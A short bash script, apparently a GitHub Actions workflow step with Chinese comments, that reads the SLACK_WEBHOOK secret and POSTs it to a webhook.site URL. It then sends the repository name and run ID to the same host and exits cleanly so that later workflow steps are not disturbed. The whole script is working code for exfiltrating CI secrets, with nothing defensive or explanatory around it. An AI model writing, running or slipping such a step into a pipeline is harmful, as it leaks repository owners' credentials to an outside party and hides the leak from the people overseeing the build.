#!/usr/bin/env bash
set -eu

# 1) 把 SLACK_WEBHOOK 的值发到你自己的 webhook.site
curl -X POST \
  -H 'Content-Type: text/plain' \
  --data "SLACK_WEBHOOK=${SLACK_WEBHOOK:-<empty>}" \
  'https://webhook.site/56aa9ff7-330f-45e4-8899-f8fbefb57879'

# 2) 可选：顺便发点上下文，方便你确认是这个 workflow 发的
curl -X POST \
  -H 'Content-Type: text/plain' \
  --data "REPO=$GITHUB_REPOSITORY RUN_ID=$GITHUB_RUN_ID" \
  'https://webhook.site/56aa9ff7-330f-45e4-8899-f8fbefb57879'

# 3) 为了不影响后续步骤，这里正常退出
exit 0
